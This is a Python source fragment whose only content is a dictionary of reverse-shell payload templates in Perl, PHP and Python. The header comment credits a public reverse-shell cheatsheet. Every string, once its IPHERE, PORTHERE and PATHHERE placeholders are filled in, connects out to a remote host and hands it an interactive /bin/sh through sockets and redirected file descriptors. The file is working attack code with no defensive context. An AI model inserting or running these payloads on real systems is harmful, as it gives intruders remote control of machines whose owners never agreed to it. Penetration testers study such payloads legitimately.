# Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
payloads = {
    "perl": [
        'PATHHERE -e \'use Socket;$i="IPHERE";$p=PORTHERE;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
    ],
    "php": [
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "PATHHERE -r '$sock=fsockopen(\"IPHERE\",PORTHERE);`/bin/sh -i <&3 >&3 2>&3`;'",
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);system("/bin/sh -i <&3 >&3 2>&3");\'',
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);passthru("/bin/sh -i <&3 >&3 2>&3");\'',
        'PATHHERE -r \'$sock=fsockopen("IPHERE",PORTHERE);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'',
    ],
    "python": [
        'PATHHERE -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
        'PATHHERE -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'PATHHERE -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHERE",PORTHERE));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
    ],
}